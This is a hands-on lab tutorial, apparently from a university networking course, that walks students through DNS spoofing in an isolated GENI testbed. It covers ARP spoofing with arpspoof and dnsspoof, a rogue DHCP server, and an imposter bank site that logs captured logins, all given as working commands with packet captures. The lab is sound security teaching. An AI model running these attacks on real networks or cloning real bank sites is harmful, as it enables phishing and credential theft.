This is an experimental demonstration of two ways a malicious attacker might redirect traffic for a website to its own "fake" version of the site. Both methods involve DNS spoofing. In one version, the attacker will masquerade as the legitimate DHCP server for the LAN and instruct clients to use the attacker for name resolution. In the other the attacker will use ARP spoofing to impersonate the legitimate DNS server and answer name resolution queries in its place.

It should take about 120 minutes to run this experiment.

This experiment involves running a potentially disruptive application over a private network within your slice on GENI. Take special care not to use this application in ways that may adversely affect other infrastructure outside of your slice! Users of GENI are responsible for ensuring compliance with the [GENI Resource Recommended User Policy](http://groups.geni.net/geni/raw-attachment/wiki/RUP/RUP.pdf).


To reproduce this experiment on GENI, you will need an account on the [GENI Portal](http://groups.geni.net/geni/wiki/SignMeUp), and you will need to have [joined a project](http://groups.geni.net/geni/wiki/JoinAProject). You should have already [uploaded your SSH keys to the portal and know how to log in to a node with those keys](http://groups.geni.net/geni/wiki/HowTo/LoginToNodes). If you're not sure if you have those skills, you may want to try [Lab Zero](http://tinyurl.com/geni-labzero) first.

## Background

DNS spoofing is a broad category of attacks in which a malicious attacker sends forged DNS responses.

A DNS server translates human-readable names like "google.com", into an IP address that applications need to connect to a remote resource (such as a website). When DNS responses are forged, the victim will (unknowingly) connect to a different host than the one it intended to reach. This kind of attack may be used in phishing attacks, to censor web traffic for some domains, to inject content such as advertisements into web traffic, or for other purposes.

One kind of DNS spoofing attack is illustrated below:

![](/blog/content/images/2016/07/dns-spoof-bad-1.svg)

There are many different ways to do DNS spoofing. In this experiment we'll try two of them: 

1. acting as a false DHCP server and lying to clients on the LAN about which DNS server to use, and 
2. mounting a man-in-the-middle attack and impersonating the real DNS server.

(For more information about DNS and DHCP services, see the experiment [Basic home gateway services: DHCP, DNS, NAT](https://witestlab.poly.edu/blog/basic-home-gateway-services-dhcp-dns-nat/).)

DNS spoofing is easiest when both the attacker and victim are on the same LAN. However, there are other (less reliable) DNS attacks that can feasibly be carried out even without access to the victim's LAN.


## Results

Here is an example of a normal DNS lookup which returns a correct address for the [Bank of Hamilton website](http://bankofhamilton.com) from the "good" server on the LAN:

<iframe width="560" height="315" src="https://www.youtube.com/embed/dMIDt59_-N0" frameborder="0" allowfullscreen></iframe>

In the next example, we use ARP spoofing for the attacker to impersonate the DNS server, and respond to DNS queries with a wrong IP address. As a result, the client is sent to a server under the attacker's control, that is masquerading as the legitimate Bank of Hamilton website:

<iframe width="560" height="315" src="https://www.youtube.com/embed/U6-DSK3PfvI" frameborder="0" allowfullscreen></iframe>

We also use a DHCP masquerade attack to similar effect. When the client looks for an IP address from DHCP, the attacker responds with an offer before the "good" server and is configured to be the client's nameserver. When the client tries to get an IP address for the Bank of Hamilton site, the attacker returns the IP address of its server that is pretending to be the real Bank of Hamilton site:

<iframe width="560" height="315" src="https://www.youtube.com/embed/ZirXGPQQieE" frameborder="0" allowfullscreen></iframe>

Finally, we see how this attack can be used to transparently capture a user's login credentials:

## Run my experiment

First, reserve your resources. This experiment involves resources on *three* separate InstaGENI sites, which you will reserve using [two different RSpecs](https://gist.github.com/ffund/5751e9bb35dd93a4531e70947fefc5d3). (Note: you will need one publicly routable IP on each InstaGENI site. If you are having trouble getting resources, you may use [this monitoring page](https://fedmon.fed4fire.eu/overview/instageni) to find sites with publicly routable IPs available.)

In the GENI Portal, create a new slice, then click "Add Resources". Load the RSpec from the URL: [https://git.io/J3IWO](https://git.io/J3IWO)

This should load a topology onto your canvas, with a client, a "good" network gateway implementing DHCP and DNS services, and a malicious attacker on the same LAN. The RSpec also includes commands to install the necessary software (e.g. `dnsmasq` for DNS and DHCP service, an Apache web server, the `dsniff` package for ARP and DNS spoofing, etc.) on the nodes. Click on "Site 1" and choose an InstaGENI site to bind to, then reserve your resources. 

Then, you will reserve a node on another InstaGENI site that will be the "malicious" banking website. In the same slice, click "Add Resources", and load the RSpec from the URL: [https://git.io/vShxD](https://git.io/vShxD)

Click on "Site 1" and  choose a _different_ InstaGENI site to bind to, then reserve your resources.

Then, you will reserve a node on another InstaGENI site that will be the "good" banking website. In the same slice, click "Add Resources", and load the RSpec from the URL: [https://git.io/vShxD](https://git.io/vShxD)

Click on "Site 1" and  choose a third, _different_ InstaGENI site to bind to, then reserve your resources.

Your complete topology should look like this (but with InstaGENI site names instead of "Site 1", etc.):

![](/blog/content/images/2021/03/topology-dnsspoof.png)

Wait for your nodes to boot up (they will turn green in the canvas display on your slice page in the GENI portal when they are ready). 

Then, wait another couple of minutes for the software installation to finish. Finally, use SSH to log in to each node in your topology (using the login details given in the GENI Portal).

### Set up the "fake" website

Your "bank" node has been set up with a publicly routable IP address, so that sites hosted on it can be reached from anywhere on the Internet. It will also have a basic web server stack installed on it already.

To set it up, you will download the content of a banking website onto your new web server. You can choose between [Diamond Bank](http://diamondbanking.com) of Arkansas _or_ [Bank of Hamilton](http://bankofhamilton.com), North Dakota. (Choose only _one_ of the two sites.) Why these sites? Both of these sites have been vulnerable to impersonation because their home page does not use [HTTPS](https://en.wikipedia.org/wiki/HTTPS) (HTTP with an SSL or TLS layer). With HTTPS, the server would have a certificate that is signed by a [Certificate Authority](https://en.wikipedia.org/wiki/Certificate_authority) (CA) that authenticates it, i.e. confirms that the site _is_ who it claims to be.

> **Editor's note**: After this experiment was written in July 2016, these two banking sites began using HTTPS ðŸŽ‰. The screenshots below show what the sites looked like in 2016.

[Modern browsers](https://arstechnica.com/information-technology/2017/01/firefox-chrome-start-calling-http-connections-insecure/) usually identify sites that accept login details on an HTTP page in the address bar, e.g. Chrome shows these sites as "Not Secure":

![](/blog/content/images/2017/04/vulnerable-sites.png)


These two banks put the form in which users enter their username and password on a page delivered by HTTP. When the user clicks "Login", the form is submitted to a page that *is* protected by HTTPS, so the username and password should be encrypted before it is sent over the link. In practice, this offers little security - the home page with the login form, which was delivered by HTTP can be compromised, so an attacker can submit the password data to a destination of their choosing, instead of (or in addition to) the intended HTTPS location. That's exactly what we'll do in this experiment.

To use the Diamond Bank site for your experiment, run

<pre>
wget https://bitbucket.org/ffund/run-my-experiment-on-geni-blog/raw/master/files/diamondbanking.tgz
sudo tar -xvzf diamondbanking.tgz -C /var/www/html/
</pre>

on the "bank" node. Alternatively, to use Bank of Hamilton, run

<pre>
wget https://bitbucket.org/ffund/run-my-experiment-on-geni-blog/raw/master/files/bankofhamilton.tgz
sudo tar -xvzf bankofhamilton.tgz -C /var/www/html/
</pre>

on the "bank" node.

> **Note**: if you get this error message at this stage 
> 
> `tar: /var/www/html: Cannot open: No such file or directory`
> 
> the software installation that runs automatically when the node boots hasn't finished yet. Wait a few more minutes, then try the command again.


In the rest of this experiment, I will assume you are using the Bank of Hamilton site; if you are using Diamond Bank, replace "bankofhamilton.com" with "diamondbanking.com" wherever it appears in the instructions that follow.

Finally, find out the public IP address of this node with

```
wget -qO- https://ipinfo.io/ip
```

Make a note of this IP address - you will need it later.

To see your "fake" website, you can put the IP address in the address bar of your browser, and hit Enter. You should see a home page similar to the one shown above, but with a "FAKE" stamp across the logo.

### Set up the "good" website

On the second "bank" node in your experiment topology, set up a "good" copy of the website. This is meant to represent the actual bank site, *not* the imposter site controlled by the attacker.

To use the Diamond Bank site for your experiment, run

<pre>
wget https://bitbucket.org/ffund/run-my-experiment-on-geni-blog/raw/master/files/diamondbanking.tgz
sudo tar -xvzf diamondbanking.tgz -C /var/www/html/
</pre>

on the "bank" node. Then, run


<pre>
sudo wget https://witestlab.poly.edu/blog/content/images/2021/03/true-diamond-logo.png -O /var/www/html/assets/images/layout/logo.png
</pre>

Alternatively, to use Bank of Hamilton, run

<pre>
wget https://bitbucket.org/ffund/run-my-experiment-on-geni-blog/raw/master/files/bankofhamilton.tgz
sudo tar -xvzf bankofhamilton.tgz -C /var/www/html/
</pre>

on the "bank" node. Then, run

<pre>
sudo wget https://witestlab.poly.edu/blog/content/images/2021/03/true-boh-logo.jpg -O /var/www/html/images/bannerbkg_img.jpg
</pre>


Finally, find out the public IP address of this node with

```
wget -qO- https://ipinfo.io/ip
```

Make a note of this IP address - you will need it later.


To see your "good" website, you can put the IP address in the address bar of your browser, and hit Enter. You should see a home page *without* a "FAKE" stamp across the logo.

### Open a browser on the client

To see what our "client" node sees when it browses the Internet, we'll need to be able to open a web browser on our client node. We will set up a VNC connection so that we can run graphical applications on the client.

On the client node, run

```
vncserver :0 
```

and enter a password (twice) when prompted. (Nothing will appear as you type the password.) Choose "n" when asked to enter a view-only password. After a few seconds and a few lines of output, you should be returned to your terminal prompt:

```
ffund01@client:~$ vncserver :0

You will require a password to access your desktops.

Password: 
Verify:   
Would you like to enter a view-only password (y/n)? n
xauth:  file /users/ffund01/.Xauthority does not exist

New 'X' desktop is client.dnsspoof.ch-geni-net.instageni.maxgigapop.net:0

Creating default startup script /users/ffund01/.vnc/xstartup
Starting applications specified in /users/ffund01/.vnc/xstartup
Log file is /users/ffund01/.vnc/client.dnsspoof.ch-geni-net.instageni.maxgigapop.net:0.log
```
 
Next, we will install a ["connector"](http://novnc.com/info.html) that will let us access this graphical interface from a web browser. On the "client" node, run

```
git clone git://github.com/kanaka/noVNC
```

and then 

<pre>
cd noVNC/
./utils/novnc_proxy --vnc $(hostname -f):5900
</pre>

After some more lines of output, you should see a URL, e.g.:

```
Navigate to this URL:

    http://client.dnsspoof.ch-geni-net.instageni.maxgigapop.net:6080/vnc.html?host=client.dnsspoof.ch-geni-net.instageni.maxgigapop.net&port=6080

```

Open this URL in a browser. (A recent version of Google Chrome is recommended.)  

> **Note**: Some InstaGENI racks have a firewall in place that will block incoming traffic on the noVNC port. If everything looks normal in the terminal output but you haven't been able to open the URL in a browser, you might want to try using a different InstaGENI rack. You don't have to delete your existing resources, or set up the bank websites again! Just click "Add Resources" on your slice, add reserve the topology from [https://git.io/fhpCT](https://git.io/fhpCT) - with the "good" gateway, attacker, and target - on a *different* InstaGENI site that you haven't used yet. 


Click "Connect", and enter a password when prompted. Then, at the terminal, run

```
firefox -private
```

and a browser window in Private Browsing mode should come up:

<iframe width="560" height="315" src="https://www.youtube.com/embed/qM3a9t2aV94" frameborder="0" allowfullscreen></iframe>

This browser is running on the "client" node, _not_ on your own laptop. (We are using Private Browsing mode so that nothing will be cached between experiments.)


**Disable DNS over HTTPS**: In 2020, Mozilla and Google both began to roll out [DNS over HTTPS](https://developers.cloudflare.com/1.1.1.1/dns-over-https/) by default in Firefox and Chrome respectively. If DoH is enabled, Firefox won't use the DNS resolver configured by the OS - it will use the DoH-supporting resolver configured in Firefox settings. To run this experiment, make sure DoH is *not* enabled in your Firefox browser, as follows.

Use the "X" in the Firefox tab to close it, then in your noVNC terminal, run

```
firefox -preferences
```

In the "General" section, scroll all the way down until you reach "Network Settings", then click "Settings".  Scroll down again and make sure the box for "Enable DNS over HTTPS" is _not_ checked. Then press "OK". 

Close your Firefox tab and open a new session with

```
firefox -private
```


### Normal DNS queries

First, we will show when happens when our client connects to a "good" DHCP+DNS server, and then tries to reach an external website. Open three terminal windows. On one, log in to the "client" node; on the other two, log in to the "good DNS/DHCP" server node.

On one of the "good" DNS/DHCP server terminals, run

<pre>
echo <b>"66.55.106.88 bankofhamilton.com"</b> > /tmp/hosts
</pre>

but in place of the IP address above, substitute the IP address of the "good" website. (Also, if using Diamond Banking, substitute the hostname diamondbanking.com as well.)

Then, run

<pre>
sudo service dnsmasq stop
sudo dnsmasq --interface=eth1 --dhcp-range=10.10.1.20,10.10.1.50,255.255.255.0,72h --dhcp-option=6,10.10.1.2 --no-hosts --bind-interfaces --addn-hosts=/tmp/hosts -d
</pre>

This sets up the `dnsmasq` server to act as a DHCP server, offering IP addresses in the range 10.10.1.20-10.10.1.50 to clients on the private LAN. It will also respond to DNS queries, and it will use the IP and hostname mappings in the `/tmp/hosts` file you created a moment ago to respond to those queries.


In the second terminal window on the "good" DNS/DHCP server, run

```
sudo tcpdump -n -i eth1 "ip"
```

to monitor IP traffic to and from the "good" DNS/DHCP server on the private LAN.

By default, the client node uses a DNS server from the GENI host site, rather than the one on our private experiment LAN. Clear this configuration by running the following on the client node:

```
# kill  running dhclient processes, if any
sudo killall dhclient
# release current IP address, if any
sudo dhclient -r eth1

# clear DNS resolution info
sudo resolvconf -d eth0.dhclient
```

(Note: the lines that begin with a `#` are comments - you don't have to run them, but if you do, they won't do anything!)


Then, on the client node, run

```
# request IP address
sudo dhclient eth1
```

to request an IP address from DHCP over the private LAN. 

In the server terminal windows, you should see the DHCP request and response in the `dnsmasq` and `tcpdump` windows, e.g.:

```
dnsmasq-dhcp: DHCPDISCOVER(eth1) 02:0f:07:a6:c6:d8 
dnsmasq-dhcp: DHCPOFFER(eth1) 10.10.1.37 02:0f:07:a6:c6:d8 
dnsmasq-dhcp: DHCPREQUEST(eth1) 10.10.1.37 02:0f:07:a6:c6:d8 
dnsmasq-dhcp: DHCPACK(eth1) 10.10.1.37 02:0f:07:a6:c6:d8 client
```

and

```
14:10:08.933742 IP 0.0.0.0.68 > 255.255.255.255.67: BOOTP/DHCP, Request from 02:0f:07:a6:c6:d8, length 300
14:10:11.187832 IP 10.10.1.2.67 > 10.10.1.37.68: BOOTP/DHCP, Reply, length 300
14:10:11.188885 IP 0.0.0.0.68 > 255.255.255.255.67: BOOTP/DHCP, Request from 02:0f:07:a6:c6:d8, length 300
14:10:11.240854 IP 10.10.1.2.67 > 10.10.1.37.68: BOOTP/DHCP, Reply, length 300
```

Note that the DHCP request is not directed at any particular server; it is sent to the broadcast address. The client node does not know in advance about the "good" DNS/DHCP server - it is willing to accept a DHCP response from any server on the LAN that replies to its broadcast message. This is what will enable our attacker to hijack DHCP on the LAN in later steps of our experiment!

Now, we'll verify that the client is using our "good" server for name resolution. First, we'll test using the `nslookup` name resolution tool. On the client, run:

```
nslookup bankofhamilton.com
```

(or, substitute diamondbanking.com if that's what you're using.)

You should see the IP address of the "good" website in the response:

```
nslookup bankofhamilton.com  
Server:		10.10.1.2
Address:   	10.10.1.2#53

Non-authoritative answer:
Name:	bankofhamilton.com
Address: 66.55.106.88
```

In the `tcpdump` output on the server, you should also see the DNS query and response:

```
14:10:20.728273 IP 10.10.1.21.56094 > 10.10.1.2.53: 28276+ A? bankofhamilton.com. (36)
14:10:20.931615 IP 10.10.1.2.53 > 10.10.1.21.56094: 28276 1/4/4 A 66.55.106.88 (198)
```

Finally, we'll visit `bankofhamilton.com` (or: `diamondbanking.com`) using the browser window that is running _on our client_, and verify that name lookup again. Again, you should see the name lookup in the `tcpdump` output on the server. (You may also see lookups for additional assets - images and scripts - that are hosted on other domains.)

<iframe width="560" height="315" src="https://www.youtube.com/embed/dMIDt59_-N0" frameborder="0" allowfullscreen></iframe>

### DNS spoofing attacks

Now, we will try two methods for DNS spoofing on a LAN:

1. The attacker uses ARP spoofing to impersonate the "good" DNS server, and responds to DNS queries for the targeted website before the "good" DNS server does. 
2. The attacker uses a DHCP masquerade attack to impersonate the "good" DHCP server, and tells the victim to use the attacker as a nameserver. Then it serves its own address in response to DNS queries for the targeted website.

Both attacks take advantage of the fact that basic network protocols like ARP and DHCP use no security measures - an attacker with access to the target's LAN can send ARP or DHCP responses that appear equally as valid as the "true" ARP and DHCP responses.

These attacks work most reliably when packets from the attacker reach the client _before_ packets from the "good" server. To ensure this happens in our experiment, we will set up some extra latency on the "good" DNS/DHCP server. 

Stop the `tcpdump` process on the "good" DNS/DHCP server, and run

<pre>
sudo tc qdisc del dev eth1 root 
# don't worry if this command returns 
# 'RTNETLINK answers: No such file or directory'
sudo tc qdisc add dev eth1 root netem delay 500ms 2ms distribution normal
</pre>

on it. 

### ARP spoofing

(This procedure assumes that you have just completed the steps in the previous sections, so that the client is already configured to use the "good" server for both DHCP and DNS lookups, and that the `dnsmasq` process is currently running on the "good" server. If you haven't gone through those steps yet, do them now.)

On the attacker, start a `tcpdump` with 

```
sudo tcpdump -i eth1 -n -e "arp or udp port 53"
```

Here, we specifically look at ARP and DNS traffic (using UDP port 53), and we also look at the Ethernet headers.



Check the client's ARP table to see what MAC address is currently associated with the server's IP address:

```
arp -a -i eth1
```

You should see the "good" server's actual MAC address, e.g. in my experiment:

```
dns-good-link-0 (10.10.1.2) at 02:b7:c8:cf:b7:ce [ether] on eth1
```

Next, we are going to use ARP spoofing to make the client associate the attacker's MAC address with the IP address of the "good" server, and make the server associate the attacker's MAC address with the IP address of the client. We'll need four terminal windows on the attacker.

On the attacker, run:


```
# Enable packet forwarding
sudo sysctl -w net.ipv4.ip_forward=1
```

In one terminal on the attacker node, run

```
# get IP address of client from the "good" server
clientip=$(dig @10.10.1.2 +short client)
# ARP spoofing in one direction
sudo arpspoof -i eth1 -t 10.10.1.2 "$clientip"
```

and leave this running. In a second terminal on the attacker node, run

```
# get IP address of client from the "good" server
clientip=$(dig @10.10.1.2 +short client)
# ARP spoofing in reverse direction
sudo arpspoof -i eth1 -t "$clientip" 10.10.1.2
```

and leave this running.


In the terminal output, you can see that the attacker sends ARPs to the client impersonating the "good" DNS server (which is at 10.10.1.2), and also sends ARPs to the "good" server impersonating the client:

```
2:60:70:39:bf:e2 2:b7:c8:cf:b7:ce 0806 42: arp reply 10.10.1.37 is-at 2:60:70:39:bf:e2
2:60:70:39:bf:e2 2:f:7:a6:c6:d8 0806 42: arp reply 10.10.1.2 is-at 2:60:70:39:bf:e2
```

On the client node, check the ARP table again with

```
arp -a -i eth1
```

You should see that what the client now believes that the "good" DNS/DHCP server's MAC address, is actually the attackers' MAC address!

```
dns-good-link-0 (10.10.1.2) at 02:60:70:39:bf:e2 [ether] on eth1
```

Finally, we're ready to offer up some bad name resolution. In a fourth terminal on the attacker, run

<pre>
echo "<b>66.104.96.102</b> bankofhamilton.com" > /tmp/badhosts
sudo dnsspoof -i eth1 -f /tmp/badhosts
</pre>

substituting for the part in bold the public IP address for the "fake" bank node that you found in a [previous step](#setupthefakewebsite) (and substitute: diamondbanking.com if using Diamond Bank).

This command creates a file called `badhosts` with a list of IP address and hostname mappings that we will fool our client into believing. In this case, our attacker will make the client go to our imposter site when he tries to visit Bank of Hamilton. Then we use the `dnsspoof` tool to answer DNS queries for those hosts.


On the client, run

```
nslookup bankofhamilton.com
```

(substitute: diamondbanking.com if using Diamond Bank).

Check the IP address returned from `nslookup`  - is it the same one as before? 

<pre>
Server:		10.10.1.2
Address:	   10.10.1.2#53

Non-authoritative answer:
Name:	bankofhamilton.com
Address: <b>66.104.96.102</b>
</pre>

Also note that the client _believes_ it has received a response from the "good" DNS/DHCP server (at 10.10.1.2), even though this actually came from the attacker.

In the `tcpdump` output, you should see the DNS query and response. First, we see that the client (02:0f:07:a6:c6:d8 in this example) sends a DNS query for bankofhamilton.com to the IP address of the good server, 10.10.1.2, but using the attacker's MAC address (02:60:70:39:bf:e2) as the destination:

```
15:01:22.684782 02:0f:07:a6:c6:d8 > 02:60:70:39:bf:e2, ethertype IPv4 (0x0800), length 78: 10.10.1.37.36285 > 10.10.1.2.53: 36777+ A? bankofhamilton.com. (36)
```

The attacker then sends a query to the "good" DNS server (on 02:b7:c8:cf:b7:ce in this example) pretending to be the client at 10.10.1.37, and finds out the actual IP address associated with that hostname. (In the event that the hostname requested  by the client is not on the list of IP addresses it will "spoof", it still needs to return an address - which it will learn from this legitimate DNS lookup.)

```
15:01:22.684815 02:60:70:39:bf:e2 > 02:b7:c8:cf:b7:ce, ethertype IPv4 (0x0800), length 78: 10.10.1.37.36285 > 10.10.1.2.53: 36777+ A? bankofhamilton.com. (36)
```

The attacker (02:60:70:39:bf:e2) sends a response to the client (02:0f:07:a6:c6:d8) claiming that the Bank of Hamilton site is at 66.104.96.102, which is the IP address of the "fake" site:

```
15:01:22.726897 02:60:70:39:bf:e2 > 02:0f:07:a6:c6:d8, ethertype IPv4 (0x0800), length 94: 10.10.1.2.53 > 10.10.1.37.36285: 36777 1/0/0 A 66.104.96.102 (52)
15:01:22.726934 02:60:70:39:bf:e2 > 02:0f:07:a6:c6:d8, ethertype IPv4 (0x0800), length 94: 10.10.1.2.53 > 10.10.1.37.36285: 36777 1/0/0 A 66.104.96.102 (52)
```

Meanwhile, the "good" DNS server sent the actual address of the Bank of Hamilton site to the attacker's MAC address, and it passes this along to the client. However, the client has already received a (wrong) IP address and won't use this one:


```
15:10:38.891177 02:b7:c8:cf:b7:ce > 02:60:70:39:bf:e2, ethertype IPv4 (0x0800), length 94: 10.10.1.2.53 > 10.10.1.37.59853: 26445 1/0/0 A 66.55.106.88 (52)
15:10:38.891215 02:60:70:39:bf:e2 > 02:0f:07:a6:c6:d8, ethertype IPv4 (0x0800), length 94: 10.10.1.2.53 > 10.10.1.37.59853: 26445 1/0/0 A 66.55.106.88 (52)
```


Finally, we'll visit `bankofhamilton.com` in the Firefox browser instance that is running on our client, and verify that it takes us to the imposter site instead of the real thing. First, use the `X` in the Firefox tab to close the current browser window. When you are returned to the terminal in your noVNC instance, run

```
firefox -private
```

again to open a fresh browser session. Type `bankofhamilton.com` in the address bar, and hit Enter. (Substitute: diamondbanking.com if using Diamond Bank.) Which version of the site do you see, the real one or the imposter? We have modified the logo of the imposter site with a big "FAKE" warning so that we can tell which site we are visiting.

<iframe width="560" height="315" src="https://www.youtube.com/embed/U6-DSK3PfvI" frameborder="0" allowfullscreen></iframe>

When you've verified the attack, use Ctrl+C to stop the `dnsspoof` process and the `arpspoof` processes.

### DHCP masquerade attack

In this version of the attack, the attacker will run its own DHCP server. When the client requests a new address from DHCP, it will get an offer from the attacker before the "good" DNS/DHCP server (because of the latency we will set up on the "good" DNS/DHCP server). As part of the DHCP response, the attacker will tell the client to use it for name resolution. Then, it can send malicious DNS responses.

This procedure assumes that you have already run the previous attack, and so you already have the `/tmp/badhosts` file set up to map the Bank of Hamilton to the IP address of your own imposter site. If you _don't_ have this, repeat the relevant steps in the previous section.

Also, the `dnsmasq` process should still be running on the "good" server.

Clear the existing DHCP and DNS settings on the client node:


```
# kill  running dhclient processes, if any
sudo killall dhclient  
# release current IP address, if any
sudo dhclient -r eth1

# clear DNS resolution info
sudo resolvconf -d eth0.dhclient  
```


Now, on the attacker, start a `dnsmasq` instance:

<pre>
sudo service dnsmasq stop
sudo dnsmasq --interface=eth1 --bind-interfaces --dhcp-range=10.10.1.20,10.10.1.50,255.255.255.0,72h --no-hosts --dhcp-option=6,10.10.1.254 --addn-hosts=/tmp/badhosts -d
</pre>

Note the `addn-hosts` option we are using, to tell `dnsmasq` to respond to queries for hostnames listed in the `badhosts` file with the corresponding addresses listed there. 


On the client node, start a `tcpdump` to show DHCP and DNS traffic:

<pre>
sudo tcpdump -i eth1 -n -e -v "udp port 67 or udp port 68 or udp port 53"
</pre>

Then, in a second terminal window on the client, run

```
sudo dhclient eth1  
```

to ask for an IP address from DHCP over the private LAN. In the `tcpdump` output, we can see the client's DISCOVER message, which is broadcast on the LAN:

<pre>
15:20:14.312030 02:0f:07:a6:c6:d8 > <b>ff:ff:ff:ff:ff:ff</b>, ethertype IPv4 (0x0800), length 342: (tos 0x10, ttl 128, id 0, offset 0, flags [none], proto UDP (17), length 328)

          Subnet-Mask, BR, Time-Zone, Default-Gateway
          Domain-Name, Domain-Name-Server, Option 119
</pre>

You should see OFFER messages from both `dnsmasq` instances - on the "good" server and on the attacker - in the `tcpdump` captures. But only one server will then get a REQUEST from the client. Since the offer from the "good" server is delayed, the client will complete the DHCP transaction with the attacker, which responded to the query first:

On the client, check the actual IP now used with

```
ifconfig eth1
```

Also, on the client run

```
cat /etc/resolv.conf
```

to check which host it is using for name resolution. Is it the "good" server (10.10.1.2) or the attacker (10.10.1.254)?

Try resolving bankofhamilton.com (or diamondbanking.com, if that's what you are using) on the client: 

```
nslookup bankofhamilton.com
```

We can see in the output that the client has queried the attacker, not the good server:

<pre>
Server:		<b>10.10.1.254</b>
Address:	   10.10.1.254#53

Name:	bankofhamilton.com
Address: <b>66.104.96.102</b>
</pre>

and this is also confirmed in the `tcpdump` output:

<pre>
15:29:58.416876 IP 10.10.1.37.55261 > <b>10.10.1.254</b>.53: 56438+ A? bankofhamilton.com. (36)
15:29:58.417019 IP <b>10.10.1.254</b>.53 > 10.10.1.37.55261: 56438* 1/0/0 A <b>66.104.96.102</b> (52)
</pre>

Also try visiting this site in the browser that is running on the client. First, use the `X` in the Firefox tab to close the current browser window. When you are returned to the terminal in your noVNC instance, run

```
firefox -private
```

again to open a fresh browser session. Type `bankofhamilton.com` in the address bar, and hit Enter. Which version of the site do you see, the real one or the imposter?

<iframe width="560" height="315" src="https://www.youtube.com/embed/ZirXGPQQieE" frameborder="0" allowfullscreen></iframe>

This attack is not deterministic - if the "good" server's DHCP offer reaches the client before the attacker's, then it won't work. (We added some delay on the "good" server to increase the probability that it will be too late to offer an address, but of course a "real" attacker would not have that ability.) You may need to repeat this experiment a couple of times in order to see it in effect.

### Capture login credentials

Finally, we will see how the login credentials may be captured (transparently) by the attacker. On the "fake" bank node, run

```
sudo tail -f /var/log/apache2/error.log
```

to watch the web server error log. We have set up our site to log all captured credentials to this file.

In the Firefox window that is running on the "client" node, attempt to log in to the Bank of Hamilton imposter site (with any username and password; it won't work, of course).

Then, return to the "fake" bank terminal window. You should observe that the username and password you entered are recorded in the log file:

```
[Wed Apr 19 20:10:14.063738 2017] [:error] [pid 11334] [client 206.196.180.223:37462] CAPTURED LOGIN: test and testpassword from 206.196.180.223, referer: http://bankofhamilton.com/
```

Meanwhile, in the browser, the user has been redirected to the regular (secure) login page for the browser, as if nothing out of the ordinary has happened:

<iframe width="560" height="315" src="https://www.youtube.com/embed/2MWgvo2wU2A" frameborder="0" allowfullscreen></iframe>

(We could potentially have set up our imposter site to pass along the username and password to this secure login page, so that the attack would really be invisible - but I have refrained from doing so, because it would be very poor "netiquette" to trigger failed logins on a 3rd party server that does not belong to us!)


### Delete your resources

When you have finished this experiment, delete your resources in the Portal to free them for other experimenters.

## Notes

### Exercise

The following [diagram](https://docs.google.com/drawings/d/1gKX_f48Vgbjg-ZphihyGJIvExNHD5k8TNCdvk3yExJQ/edit?usp=sharing) shows the exchange of packets (in chronological order) between the client, the "good" server, and the attacker, for a [normal](##normaldnsqueries) DHCP transaction and DNS query/response:

![](/blog/content/images/2017/04/dnsspoof-good-diagram-1.svg)

Using the results of your own experiment, create three diagrams similar to the one above, one for each of the scenarios:

1. Normal DHCP and DNS resolution of the bank's hostname.
2. DNS spoofing attack with ARP spoofing.
3. DNS spoofing attack with DHCP masquerade.

In each diagram, show the relevant details of the ARP, DNS, and DHCP messages that you observed in your experiment for that scenario. Also, 

* Label the client, "good" server, and attacker with their (real) MAC addresses.
* Show broadcast packets arriving at all other hosts in the LAN (except the sender).
* For the ARP spoofing experiment, you need only show one example of _each_ ARP (you don't have to show repeated identical ARPs).
* The diagram above shows what relevant information to include for DNS and DHCP packets. Here is a template you can use for ARP messages:

<pre>
<b>ARP</b>: 10.10.1.2 is at 02:60:70:39:bf:e2
02:60:70:39:bf:e2 > 02:0f:07:a6:c6:d8
</pre>

After each diagram, include the terminal output in which you observe the packets shown in the diagram. Make sure to label which host the output comes from. **Don't** just dump everything you see into your report - include only the relevant parts of your output, and highlight the important details.
